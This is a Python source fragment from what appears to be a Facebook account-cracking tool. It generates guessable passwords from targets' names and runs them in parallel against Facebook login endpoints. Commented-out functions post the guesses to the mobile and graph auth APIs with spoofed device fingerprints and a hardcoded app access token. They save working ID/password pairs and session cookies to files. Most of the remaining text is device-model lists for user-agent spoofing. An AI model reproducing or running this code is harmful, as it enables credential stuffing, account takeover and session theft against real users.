    with tred(max_workers=30) as pool:
        for yuzong in id2:
            idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
            frs = nmf.split(' ')[0]
            pwv = []
            if len(nmf)<6:
                if len(frs)<3:
                    pass
                else:                
                    pwv.append(frs+'12')
                    pwv.append(frs+'123')
                    pwv.append(frs+'1234')
                    pwv.append(frs+'12345')
                    pwv.append(frs+'123456')
                    pwv.append(nmf)
                    pwv.append(frs+'@12')
                    pwv.append(frs+'@123')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'@12345')
                    pwv.append(frs+'@123456')
                    pwv.append(frs+'@111')
                    pwv.append(frs+'@1111')
                    pwv.append(frs+'@@')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@1234')
                    pwv.append(frs+'@12345')
                    pwv.append(frs+'@@@')
                    pwv.append(frs+'@#')
                    pwv.append(frs+'123@')
                                                
            else:
                if len(frs)<3:
                    pwv.append(nmf)
                else:
                   pwv.append(frs+'12')
                   pwv.append(frs+'123')
                   pwv.append(frs+'1234')
                   pwv.append(frs+'12345')
                   pwv.append(frs+'123456')
                   pwv.append(nmf)
                   pwv.append(frs+'@12')
                   pwv.append(frs+'@123')
                   pwv.append(frs+'@1234')
                   pwv.append(frs+'@12345')
                   pwv.append(frs+'@123456')
                   pwv.append(frs+'@111')
                   pwv.append(frs+'@1111')
                   pwv.append(frs+'@@')
                   pwv.append(frs+'@@@')
                   pwv.append(frs+'@1234')
                   pwv.append(frs+'@12345')
                   pwv.append(frs+'@@@')
                   pwv.append(frs+'@#')
                   pwv.append(frs+'123@')
                                        
            if 'ya' in pwpluss:
                for xpwd in pwnya:
                    pwv.append(xpwd)
            else:pass
            if 'mobile' in method:
                pool.submit(crack,idf,pwv)
            elif 'free' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'touch' in method:
                pool.submit(crackfree,idf,pwv)
            elif 'mbasic' in method:
                pool.submit(crackfree,idf,pwv)
            else:
                pool.submit(crackfree,idf,pwv)
    print('\033[0;91m-----------------------------------------------')
    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETE TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
    print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s '%(ok))
    print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
    print('\033[0;91m-----------------------------------------------')
    woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
    os.system("python TOXIC.py")
    exit() 

#--------------------[ METODE-B-API ]-----------------#
 
 
# def crackfree(idf,pwv):
#     global loop,ok,cp
#     sys.stdout.write(f"\r {P}[SUPRAJ-XD]{P} {P}{loop}{P}/{P}{len(id)}{P} OK{P}[{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
#     sys.stdout.flush()
#     ua = random.choice(ugen)
#     ua2 = random.choice(ugen2)
#     ses = requests.Session()
#     for pw in pwv:
#         try:
# 			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': 'random.choice(get_ua_list)','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start *;q=0.8,application/signed-exchange;v=b3;q=0.7','dnt':'1','x-requested-with':'mark.via.gp','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors' 'sec-fetch-user' 'empty', 'sec-fetch-dest' :'document','referer':'https://m. facebook.com/','accept-encoding': 'gzip, deflate br','accept-language':'en-US,en;q=0.9,ne-NP;q=0.8,ne;q=0.7'})
# 			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D658182831284939%26cbt%3D1684044646644%26e2e%3D%257B%2522init%2522%253A1684044646645%257D%26ies%3D0%26sdk%3Dandroid-12.3.0%26sso%3Dchrome_custom_tab%26nonce%3D297fce79-2a5f-4f0e-a658-2984b6b37b72%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252236e881f3-202f-4db0-aada-31426d46b4d8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522822h3mg0brumh7ep2ga3%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb658182831284939%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D36e881f3-202f-4db0-aada-31426d46b4d8%26tp%3Dunspecified&cancel_url=fb658182831284939%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252236e881f3-202f-4db0-aada-31426d46b4d8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522822h3mg0brumh7ep2ga3%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
# 			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pw,}
# 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
# 			koki+=' m_pixel_ratio=2.625; wd=412x756'
# 			heade={'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D658182831284939%26cbt%3D1684044646644%26e2e%3D%257B%2522init%2522%253A1684044646645%257D%26ies%3D0%26sdk%3Dandroid-12.3.0%26sso%3Dchrome_custom_tab%26nonce%3D297fce79-2a5f-4f0e-a658-2984b6b37b72%26scope%3Dopenid%252Cpublic_profile%252Cemail%26state%3D%257B%25220_auth_logger_id%2522%253A%252236e881f3-202f-4db0-aada-31426d46b4d8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522822h3mg0brumh7ep2ga3%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb658182831284939%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D36e881f3-202f-4db0-aada-31426d46b4d8%26tp%3Dunspecified&cancel_url=fb658182831284939%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252236e881f3-202f-4db0-aada-31426d46b4d8%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%2522822h3mg0brumh7ep2ga3%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
# 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
# 			if "checkpoint" in po.cookies.get_dict().keys():
# 				print(f'\r{x}[{m}x{x}] {k}{idf}|{pw} >> {cektahun(idf)}{x}\n{ua}{N}')
# 				open('CP/'+cph,'a').write(idf+'|'+pw+'\n')
# 				cp+=1
# 				break
# 			elif "c_user" in ses.cookies.get_dict().keys():
# 				ok+=1
# 				coki=po.cookies.get_dict()
# 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
# 				cookie = f"sb={sb};{kuki}"
# 				kukis = kuki.replace(f'c_user={idf};datr','sb')
# 				print(f'\r{x}[{b}âœ“{x}] {h}{idf}|{pw} >> {cektahun(idf)}\n{kukis}\n{x}{ua}{N}')
# 				open('OK/'+okh,'a').write(idf+'|'+pw+'|'+kuki+'\n')
# 				print(f"\033[38;5;46m[\033[0;36mCOOKIE\033[38;5;46m]> {cookie}")
# 				cek_apk(session,coki)
# 				break
				
# 			else:
# 				continue
# 		except requests.exceptions.ConnectionError:
# 			waktu(31)
# 	loop+=1

#----------
# def crackfree(ids,names,passlist):
#         try:
#                 global ok,loop,sim_id
#                 ua = random.choice(ugen)
#                 sys.stdout.write('\r\r\033[1;37m [R-RUNING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
#                 fn = names.split(' ')[0]
#                 try:
#                         ln = names.split(' ')[1]
#                 except:
#                         ln = fn
#                 for pw in passlist:
#                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
#                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
#                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
#                         fbbv = str(random.randint(111111111,999999999))
#                         android_version = device['android_version']
#                         model = device['model']
#                         build = device['build']
#                         fblc = device['fblc']
#                         fbcr = sim_id
#                         fbmf = device['fbmf']
#                         fbbd = device['fbbd']
#                         fbdv = device['fbdv']
#                         fbsv = device['fbsv']
#                         fbca = device['fbca']
#                         fbdm = device['fbdm']
#                         fbfw = '1'
#                         fbrv = '0'
#                         fban = 'FB4A'
#                         fbpn = 'com.facebook.katana'
#                         en = random.choice(['en_US','en_GB'])
#                         cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
#                         network = random.choice(['Zong','null','Marshmallow','Telekom China'])
#                         ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/309.0.0.47.119;FBBV/277444756;FBDM/{density=3.0,width=1080,height=1920};FBLC/de_DE;FBRV/279865282;FBCR/Willkommen;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G930F;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
#                         random_seed = random.Random()
#                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
#                         device_id = str(uuid.uuid4())
#                         secure = str(uuid.uuid4())
#                         family = str(uuid.uuid4())
#                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
#                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
#                         sim_serials = f'["{xd}"]'
#                         li = ['28','29','210']
#                         li2 = random.choice(li)
#                         j1 = ''.join(random.choice(digits) for _ in range(2))
#                         jazoest = li2+j1
#                         data={"adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),"cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password","error_detail_type": "button_with_disabled","source": "device_based_login","email":ids,"password":pas,"access_token":"350685531728|62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),"currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US","method": "auth.login","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"}
#                         headers = {"Content-Type": "application/x-www-form-urlencoded","Host": "graph.facebook.com","User-Agent": ua,"X-FB-Net-HNI": "45204","X-FB-SIM-HNI": "45201","X-FB-Connection-Type": "MOBILE.LTE","X-Tigon-Is-Retry": "False","x-fb-session-id": "nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group": "5120","X-FB-Friendly-Name": "ViewerReactionsMutation","X-FB-Request-Analytics-Tags": "graphservice","Accept-Encoding": "gzip, deflate","X-FB-HTTP-Engine": "Liger","X-FB-Client-IP": "True","X-FB-Server-Cluster": "True","x-fb-connection-token": "d29d67d37eca387482a8a5b740f84f62","Connection": "Keep-USMII"}
#                         url = 'https://b-graph.facebook.com/auth/login'
#                         twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
#                         po = requests.post(url,data=data,headers=headers).json()
#                         if 'session_key' in po:
#                                         print('\r\r\033[1;32m [R-OK] '+ids+' | '+pas+'\033[1;97m')
#                                         coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
#                                         #print("\r\r\033[1;33m Cookie: "+coki)
#                                         open('/sdcard/R-COOKIE.txt','a').write(ids+'|'+pas+ ' | ' +coki+'\n')
#                                         open('/sdcard/R-OK.txt','a').write(ids+'|'+pas+'\n')
#                                         oks.append(ids)
#                                         break
#                         elif twf in str(po):
#                                         if 'y' in pcp:
#                                                 print('\r\r \033[1;34m[R-2F] '+ids+' | '+pas)
#                                                 twf.append(ids)
#                                                 break
#                         elif 'www.facebook.com' in po['error']['message']:
#                                         if 'y' in pcp:
#                                                 print('\r\r\x1b[1;31m [R-CP] '+ids+' | '+pas+'\033[1;97m')
#                                                 open('/sdcard/R-CP.txt','a').write(ids+'|'+pas+'\n')
#                                                 break
#                                                 cps.append(ids)
#                                         else:
#                                                 open('/sdcard/R-CP.txt','a').write(ids+'|'+pas+'\n')
#                                                 break
#                                                 cps.append(ids)
#                         else:
#                                         continue
#                 loop+=1
#         except Exception as e:
#                 pass
# xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
# def api(ids,names,passlist):
#         try:
#                 global ok,loop,sim_id
#                 ua = random.choice(ugen)
#                 sys.stdout.write('\r\r\033[1;37m [R-RUNING ] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
#                 fn = names.split(' ')[0]
#                 try:
#                         ln = names.split(' ')[1]
#                 except:
#                         ln = fn
#                 for pw in passlist:
#                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
#                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
#                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
#                         fbbv = str(random.randint(111111111,999999999))
#                         android_version = device['android_version']
#                         model = device['model']
#                         build = device['build']
#                         fblc = device['fblc']
#                         fbcr = sim_id
#                         fbmf = device['fbmf']
#                         fbbd = device['fbbd']
#                         fbdv = device['fbdv']
#                         fbsv = device['fbsv']
#                         fbca = device['fbca']
#                         fbdm = device['fbdm']
#                         fbfw = '1'
#                         fbrv = '0'
#                         fban = 'FB4A'
#                         fbpn = 'com.facebook.katana'
#                         en = random.choice(['en_US','en_GB'])
#                         motorola= random.choice(['M Bot 54', 'M Bot 60', 'M1', 'M3', 'M3s', 'M5 Lite', 'M6 Note', 'Magic', 'Maimang 5', 'Mate 10 Lite Dual SIM', 'Mate 20 X (China)', 'Mate 8', 'MB526', 'Medias X', 'MI 2', 'MI 3W', 'Mi 4 LTE', 'MI 4i', 'MI 5', 'MI 5X', 'Mi A1', 'Mi Max', 'Mi Max 2', 'Mi Mix 2', 'Milestone', 'Miracle', 'Moment (Sprint)', 'Monza', 'Motion Plus', 'Moto C', 'Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'Moto X 2nd Gen (AT&T)', 'Moto Z', 'Multipad 2 Ultra Duo 8.0 3G', 'MultiPhone 3350 Duo', 'MultiPhone 4044 Duo', 'MultiPhone 5504 DUO', 'Multiphone 7600 Duo', 'MX2', 'MX380', 'MX5'])
#                         mmp = random.choice(['13 Pro','Black Shark','Black Shark 2','Black Shark 3','Black Shark 3S','Black Shark 4','Black Shark 4 Pro','Black Shark 5','Black Shark 5 Pro','Black Shark Helo','Civi','Civi 2','Hongmi','Hongmi 1S','Hongmi 2','Hongmi 2 3G','Hongmi 2 4G','Hongmi 4G','Hongmi Note 1TD','Mi Box 4','Mi Cancro','Mi CC 9','Mi CC 9 Pro','Mi CC 9e','Mi CC9','Mi Laser Projector 150','Mi Max','Mi Max 2','Mi Max 3','Mi MAX2','Mi Max3','Mi Mix','Mi Mix 2','Mi Mix 2S','Mi Mix 3','Mi Mix 3 5G','Mi Mix 4','Mi Mix Fold','Mi Note 10','Mi Note 10 Lite','Mi Note 10 Pro','Mi Note 11','Mi Note 2','Mi Note 3','Mi Note 8','Mi Note LTE','Mi Note Pro','Mi Note10','Mi Note5','Mi One','Mi One C1','Mi One Plus','Mi Pad','Mi Pad 2','Mi Pad 3','Mi Pad 4','Mi Pad 4 Plus','Mi Pad 5','Mi Pad 5 Pro','Mi Pad 5 Pro 5G','Mi Pad4','Mi Pad5','Mi Play','Mi XL','Mi5','MiTV 4A','MiTV 4A Pro','MiTV 4C','MiTV 4I','MiTV 4S','MiTV 4X','MiTV P1','MiTV Q1','MiTV Stick','MiTV Stick 4K','Mix Fold 2','MT6765 G Series','Note 12 Pro','Pad 6 Pro','Pocophone F1','Qin 1s+','Qin 2','Qin 2 Pro','Redmi 11','Redmi 12','Redmi 2','Redmi 3','Redmi 4','Redmi 5','Redmi 6','Redmi 7','Redmi 8','Redmi 9','Redmi A1','Redmi A2','Redmi A3','Redmi K30','Redmi K40','Redmi K50','Redmi K60','Redmi note','Redmi Note 1','Redmi Note 10Redmi Note 11','Redmi Note 12','Redmi Note 12T','Redmi Note 13','Redmi Note 15 Pro','Redmi Note 2','Redmi Note 3','Redmi Note 4','Redmi Note 5','Redmi Note 5 Pro','Redmi Note 6','Redmi Note 7','Redmi Note 7 Pro','Redmi Note 8 Pro','Redmi Note 8T','Redmi Note 9','Redmi Note 9 5G','Redmi Note 9 Pro','Redmi Note 9 Pro 5G','Redmi Note 9 Pro Max','Redmi Note 9S','Redmi Note 9T','Redmi Note 9T 5G','Redmi Note Prime','Redmi Note10','Redmi Note10T','Redmi Note7','Redmi Note8','Redmi Note8T','Redmi Note9','Redmi Pad','Redmi Pro','Redmi S2','Redmi X','Redmi Y1','Redmi Y1 Lite','Redmi Y2','Redmi Y3','Redmi 2', 'Redmi 3', 'Redmi 3S', 'Redmi 4', 'Redmi 4A', 'Redmi 4X', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 4X', 'Redmi Note 5', 'Redmi Note 5 Pro', 'Redmi Note 5A', 'Redmi Note 5A Prime', 'Redmi S2', 'Redmi Y1', 'Redmi Y1 Lite', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby'])
#                         mmm = random.choice(['Ruby', 'V10 (AT&T)', 'V10 (T-Mobile)', 'V10 (Verizon)', 'V1Max', 'V20', 'V20 (AT&T)', 'V20 (Sprint)', 'V20 (T-Mobile)', 'V20 (Verizon)', 'V3', 'V5', 'V5s', 'V7', 'V7 Plus', 'V808', 'V9', 'Valencia', 'Vdeo 2', 'Vega Iron 2 WiFi', 'Vibe K5', 'Vibe K5 Note', 'Vibe K5 Plus Dual SIM', 'Vibe X', 'Vibe Z', 'Vision', 'Vision 3 Dual SIM', 'Volt LS740', 'VR Bot 552', 'VX5500', 'Y21', 'Y21L', 'Y28', 'Y3 (2018)', 'Y336-U02', 'Y5 Dual SIM (2017)', 'Y5 II', 'Y5 Prime 2018 Dual SIM', 'Y51', 'Y51L', 'Y55L', 'Y6 (2018)', 'Y6 Dual SIM (2018)', 'Y6 Prime (2018)', 'Y65', 'Y66', 'Y69', 'Y71', 'Y81', 'Y83', 'Yota Phone 2', 'YP-GI1'])
#                         bbbb = random.choice(['PQ3B.190801.002', 'PQ1A.181205.002.A1', 'G950FXXU4DSBA', 'G950FXXS5DSF1', 'G950FXXS8DTC6', 'G998USQU1ATCU', 'G985FXXU7DTJ2', 'N986BXXU1BTJ4', 'A525FXXU3AUG4', 'T970XXU3BUI7', 'F916BXXU1BTKF', 'N970FXXS8ETK4', 'G975USQU4ETG1', 'A715FXXU3ATI8', 'T500XXU3BUA8', 'OPM6.171019.030.K1', 'OPM2.171026.006.C1', 'TQ1A.230105.001.A3', 'SQ1A.211205.008', 'SD1A.210817.037.A1', 'RP1A.201005.004.A1', 'PQ1A.181205.006', 'N9F27L', 'PPR1.180610.011', 'PPR2.180905.006', 'QP1A.191105.003', 'RD1A.201105.003.C1', 'MMB29U', 'NDE63H', 'N4F26J', 'NMF27D', 'N4F26X', 'KOT49H', 'JWR66L', 'LMY48G', 'LMY48J', 'MDB08M', 'HLK75H', 'HLK75F', 'HRI83', 'HLK75C', 'EPE54B', 'G950FXXU3CRGH', 'G950FXXS6DTA1'])
#                         mmmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
#                         mmmm = random.choice(['Optimus Vu', 'OT-7025D', 'P10 Lite LTE', 'P2', 'P20 Lite', 'P30 Pro (Global)', 'P3400', 'P55 Max', 'P7 Max', 'P8 Lite', 'P9 Lite', 'Pacific 800i', 'Pearl 8100', 'Phoenix 2', 'Phone', 'Pixel', 'Pixel 3', 'Pixel XL', 'Pixi', 'Prada 3.0', 'Pre3', 'Primo GH7', 'Quad EVO Energy 5', 'Quantum 4', 'Radar 4G', 'Radar C110e', 'Realme 2', 'Red Rice', 'Redmi 2', 'Redmi 3', 'Redmi 4', 'Redmi 5', 'Redmi 5 Plus', 'Redmi 5A', 'Redmi 6', 'Redmi Note 3', 'Redmi Note 4', 'Redmi Note 5', 'Redmi S2', 'Redmi Y1', 'Redmi Y2', 'Rex 60', 'Rex 80', 'Rhyme', 'RM-560', 'Ruby', 'S4502M', 'S4505M', 'S4702M', 'S580', 'S616', 'S660', 'Sensation', 'SGH-E250', 'SGH-I547', 'SM-G485F', 'Spark', 'Star 3 Duos', 'Storm 9530', 'Stream', 'Stylo 2 Plus (T-Mobile)', 'Stylus 2', 'TM-4377', 'Torch 4G 9810'])
#                         cph = random.choice(['CPH1979','CPH1983','CPH1987','CPH2005','CPH2009','CPH2015','CPH2059','CPH2061','CPH2065','CPH2069','CPH2071','CPH2073','CPH2077','CPH2091','CPH2095','CPH2099','CPH2137','CPH2139','CPH2145','CPH2161','CPH2185','CPH2201','CPH2209','CPH1801','CPH1803','CPH1805','CPH1809','CPH1827','CPH1837','CPH1851','CPH1853'])
#                         network = random.choice(['Zong','null','Marshmallow','Telekom China'])
